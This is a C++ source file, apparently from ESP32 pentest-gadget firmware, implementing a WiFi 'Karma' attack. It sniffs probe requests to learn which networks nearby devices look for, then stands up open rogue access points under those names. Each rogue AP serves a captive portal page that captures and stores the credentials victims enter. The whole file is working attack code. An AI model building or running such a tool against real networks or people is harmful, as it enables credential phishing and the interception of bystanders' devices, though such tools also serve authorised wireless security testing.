#include "WifiKarmaScreen.h"
#include "core/Device.h"
#include "core/ScreenManager.h"
#include "screens/wifi/WifiMenuScreen.h"
#include "ui/actions/ShowStatusAction.h"
#include "ui/actions/InputNumberAction.h"

#include <WiFi.h>

WifiKarmaScreen* WifiKarmaScreen::_instance = nullptr;

// ── Destructor ──────────────────────────────────────────────────────────────

WifiKarmaScreen::~WifiKarmaScreen()
{
  _stopAttack();
  _instance = nullptr;
}

// ── Callbacks ───────────────────────────────────────────────────────────────

void WifiKarmaScreen::_onVisit(void* ctx)
{
  auto* self = static_cast<WifiKarmaScreen*>(ctx);
  self->_log.addLine("[+] Portal visited");
}

void WifiKarmaScreen::_onPost(const String& data, void* ctx)
{
  auto* self = static_cast<WifiKarmaScreen*>(ctx);
  self->_log.addLine("[+] Credential captured!", TFT_GREEN);

  String ssid = (self->_currentIdx < self->_ssidCount)
    ? String(self->_ssids[self->_currentIdx]) : "unknown";
  self->_portal.saveCaptured(data, "karma_" + ssid);
  self->_inputStartTime = millis();
}

// ── Lifecycle ───────────────────────────────────────────────────────────────

void WifiKarmaScreen::onInit()
{
  _instance = this;
  _showMenu();
}

void WifiKarmaScreen::onItemSelected(uint8_t index)
{
  if (_state == STATE_MENU) {
    switch (index) {
      case 0:
        _saveList = !_saveList;
        _saveListSub = _saveList ? "On" : "Off";
        _menuItems[0].sublabel = _saveListSub.c_str();
        render();
        break;
      case 1: { // Portal
        _state = STATE_SELECT_PORTAL;
        if (_portal.selectPortal()) {
          _showMenu();
        } else {
          _state = STATE_MENU;
          render();
        }
        break;
      }
      case 2: {
        int val = InputNumberAction::popup("Wait Connect (s)", 5, 120, _waitConnect);
        if (val >= 5) _waitConnect = val;
        _showMenu();
        break;
      }
      case 3: {
        int val = InputNumberAction::popup("Wait Input (s)", 10, 600, _waitInput);
        if (val >= 10) _waitInput = val;
        _showMenu();
        break;
      }
      case 4: _startAttack(); break;
    }
  }
}

void WifiKarmaScreen::onUpdate()
{
  if (_state != STATE_RUNNING) {
    ListScreen::onUpdate();
    return;
  }

  // Handle exit
  if (Uni.Nav->wasPressed()) {
    const auto dir = Uni.Nav->readDirection();
    if (dir == INavigation::DIR_BACK || dir == INavigation::DIR_PRESS) {
      _stopAttack();
      _showMenu();
      return;
    }
  }

  // DNS
  _portal.processDns();

  unsigned long now = millis();

  if (_apActive) {
    int clients = WiFi.softAPgetStationNum();

    // Client just connected
    if (clients > 0 && !_clientConnected) {
      _clientConnected = true;
      _inputStartTime = now;
      char buf[60];
      snprintf(buf, sizeof(buf), "[+] Client connected to: %s", _ssids[_currentIdx]);
      _log.addLine(buf, TFT_GREEN);
    }

    // Phase 1: waiting for device to connect
    if (!_clientConnected) {
      if (now - _apStartTime > (unsigned long)_waitConnect * 1000) {
        char buf[60];
        snprintf(buf, sizeof(buf), "[-] Timeout: %s", _ssids[_currentIdx]);
        _log.addLine(buf);
        _blacklistSSID(_ssids[_currentIdx]);
        _teardownAP();
        _currentIdx++;
      }
    }
    // Phase 2: waiting for form input
    else {
      if (now - _inputStartTime > (unsigned long)_waitInput * 1000) {
        char buf[60];
        snprintf(buf, sizeof(buf), "[-] Input timeout: %s", _ssids[_currentIdx]);
        _log.addLine(buf);
        _blacklistSSID(_ssids[_currentIdx]);
        _teardownAP();
        _currentIdx++;
      }
    }
  }

  // Deploy next available SSID
  if (!_apActive) {
    while (_currentIdx < _ssidCount) {
      if (!_isBlacklisted(_ssids[_currentIdx])) {
        _deployAP(_ssids[_currentIdx]);
        break;
      }
      _currentIdx++;
    }
  }

  // Redraw
  if (now - _lastDraw > 500) {
    _drawLog();
    _lastDraw = now;
  }
}

void WifiKarmaScreen::onBack()
{
  if (_state == STATE_SELECT_PORTAL) {
    _showMenu();
  } else if (_state == STATE_RUNNING) {
    _stopAttack();
    _showMenu();
  } else {
    Screen.setScreen(new WifiMenuScreen());
  }
}

// ── Menu ────────────────────────────────────────────────────────────────────

void WifiKarmaScreen::_showMenu()
{
  _state = STATE_MENU;
  _saveListSub    = _saveList ? "On" : "Off";
  _portalSub      = _portal.portalFolder().isEmpty() ? "-" : _portal.portalFolder();
  _waitConnectSub = String(_waitConnect) + "s";
  _waitInputSub   = String(_waitInput) + "s";

  _menuItems[0] = {"Save WiFi List",  _saveListSub.c_str()};
  _menuItems[1] = {"Captive Portal",  _portalSub.c_str()};
  _menuItems[2] = {"Waiting Time",    _waitConnectSub.c_str()};
  _menuItems[3] = {"Waiting Input",   _waitInputSub.c_str()};
  _menuItems[4] = {"Start"};
  setItems(_menuItems, 5);
}

// ── Probe Sniffer ───────────────────────────────────────────────────────────

void IRAM_ATTR WifiKarmaScreen::_promiscuousCb(void* buf, wifi_promiscuous_pkt_type_t type)
{
  if (type != WIFI_PKT_MGMT || !_instance) return;

  const wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
  const uint8_t* frame = pkt->payload;

  if (frame[0] != 0x40) return;

  uint8_t ssidLen = frame[25];
  if (ssidLen < 1 || ssidLen > 32) return;

  char ssid[33];
  memcpy(ssid, &frame[26], ssidLen);
  ssid[ssidLen] = '\0';

  bool allSpace = true;
  for (int i = 0; i < ssidLen; i++) {
    if (ssid[i] != ' ') { allSpace = false; break; }
  }
  if (allSpace) return;

  _instance->_onProbe(ssid);
}

void WifiKarmaScreen::_onProbe(const char* ssid)
{
  for (int i = 0; i < _ssidCount; i++) {
    if (strcmp(_ssids[i], ssid) == 0) return;
  }
  if (_isBlacklisted(ssid)) return;
  if (_ssidCount >= MAX_SSIDS) return;

  strncpy(_ssids[_ssidCount], ssid, 32);
  _ssids[_ssidCount][32] = '\0';
  _ssidCount++;
  _capturedCount++;

  char buf[60];
  snprintf(buf, sizeof(buf), "[*] Probe: %s", ssid);
  _log.addLine(buf);

  if (_saveList) _saveSSIDToFile(ssid);
}

void WifiKarmaScreen::_startSniffing()
{
  esp_wifi_set_promiscuous(false);
  esp_wifi_stop();
  esp_wifi_set_promiscuous_rx_cb(NULL);
  esp_wifi_deinit();
  delay(200);

  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  esp_wifi_init(&cfg);
  esp_wifi_start();
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&_promiscuousCb);

  _log.addLine("[*] Sniffing probes...");
}

void WifiKarmaScreen::_stopSniffing()
{
  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(NULL);
}

// ── AP Deployment ───────────────────────────────────────────────────────────

void WifiKarmaScreen::_deployAP(const char* ssid)
{
  _stopSniffing();

  WiFi.mode(WIFI_AP_STA);
  WiFi.softAP(ssid, NULL, 1, 0, 4);
  delay(100);

  IPAddress apIP = WiFi.softAPIP();

  // Start portal server if not already running
  if (!_portal.server()) {
    _portal.start(apIP);
  }

  _apActive = true;
  _apStartTime = millis();
  _clientConnected = false;

  char buf[60];
  snprintf(buf, sizeof(buf), "[>] AP: %s (%ds)", ssid, _waitConnect);
  _log.addLine(buf);
}

void WifiKarmaScreen::_teardownAP()
{
  _portal.stop();
  WiFi.softAPdisconnect(true);
  _apActive = false;
  _clientConnected = false;

  _startSniffing();
}

// ── Start / Stop ────────────────────────────────────────────────────────────

void WifiKarmaScreen::_startAttack()
{
  if (_portal.portalFolder().isEmpty()) {
    ShowStatusAction::show("Select a portal first!");
    return;
  }
  if (!StorageUtil::hasSpace()) {
    ShowStatusAction::show("Storage full! (<20KB free)");
    return;
  }

  _state = STATE_RUNNING;
  _log.clear();
  _ssidCount      = 0;
  _blacklistCount = 0;
  _currentIdx     = 0;
  _capturedCount  = 0;
  _apActive       = false;
  _lastDraw       = 0;

  _portal.setCallbacks(_onVisit, _onPost, this);
  _portal.loadPortalHtml();

  if (_portal.portalHtml().isEmpty()) {
    ShowStatusAction::show("Portal HTML not found!");
    _state = STATE_MENU;
    return;
  }

  _log.addLine("[*] Karma Attack started");
  _log.addLine("[*] BACK/Press to stop");
  _startSniffing();

  _drawLog();
}

void WifiKarmaScreen::_stopAttack()
{
  _stopSniffing();
  _portal.reset();
  WiFi.softAPdisconnect(true);
  WiFi.mode(WIFI_OFF);

  _apActive       = false;
  _clientConnected = false;
  _ssidCount      = 0;
  _blacklistCount = 0;
  _currentIdx     = 0;
}

// ── Save to file ────────────────────────────────────────────────────────────

void WifiKarmaScreen::_saveSSIDToFile(const char* ssid)
{
  if (!Uni.Storage || !Uni.Storage->isAvailable()) return;
  if (!StorageUtil::hasSpace()) {
    _log.addLine("[!] Storage full, skip save", TFT_RED);
    return;
  }

  Uni.Storage->makeDir("/unigeek/wifi/captives");
  String path = "/unigeek/wifi/captives/karma_ssid.txt";

  char line[80];
  struct tm timeinfo;
  if (getLocalTime(&timeinfo, 0)) {
    char ts[20];
    strftime(ts, sizeof(ts), "%Y-%m-%d %H:%M:%S", &timeinfo);
    snprintf(line, sizeof(line), "%s:%s", ts, ssid);
  } else {
    snprintf(line, sizeof(line), "%lu:%s", millis() / 1000, ssid);
  }

  fs::File f = Uni.Storage->open(path.c_str(), FILE_APPEND);
  if (f) {
    f.println(line);
    f.close();
  }
}

// ── Blacklist ───────────────────────────────────────────────────────────────

bool WifiKarmaScreen::_isBlacklisted(const char* ssid)
{
  for (int i = 0; i < _blacklistCount; i++) {
    if (strcmp(_blacklist[i], ssid) == 0) return true;
  }
  return false;
}

void WifiKarmaScreen::_blacklistSSID(const char* ssid)
{
  if (_blacklistCount >= MAX_SSIDS) return;
  strncpy(_blacklist[_blacklistCount], ssid, 32);
  _blacklist[_blacklistCount][32] = '\0';
  _blacklistCount++;
}

// ── Log Display ─────────────────────────────────────────────────────────────

void WifiKarmaScreen::_drawLog()
{
  auto* self = this;
  _log.draw(Uni.Lcd, bodyX(), bodyY(), bodyW(), bodyH(),
    [](TFT_eSprite& sp, int barY, int w, void* ud) {
      auto* s = static_cast<WifiKarmaScreen*>(ud);
      sp.setTextColor(TFT_GREEN, TFT_BLACK);
      sp.setTextDatum(TL_DATUM);
      char stats[40];
      snprintf(stats, sizeof(stats), "AP:%d V:%d P:%d",
               s->_capturedCount, s->_portal.visitCount(), s->_portal.postCount());
      sp.drawString(stats, 2, barY, 1);
      sp.setTextDatum(TR_DATUM);
      if (s->_apActive && s->_currentIdx < s->_ssidCount) {
        sp.drawString(String(s->_ssids[s->_currentIdx]).substring(0, 14), w - 2, barY, 1);
      } else {
        sp.drawString("Sniffing...", w - 2, barY, 1);
      }
    }, self);
}
